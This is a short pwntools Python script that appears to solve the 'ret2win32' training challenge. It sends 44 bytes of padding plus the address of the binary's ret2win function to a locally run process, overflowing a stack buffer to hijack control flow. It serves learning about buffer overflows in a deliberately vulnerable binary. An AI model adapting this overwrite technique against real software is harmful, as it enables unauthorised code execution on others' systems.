from pwn import *
p = ELF('./ret2win32')
r = process('./ret2win32')

ret2win = p.symbols['ret2win']
junk = b'X'*44
junk += p32(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()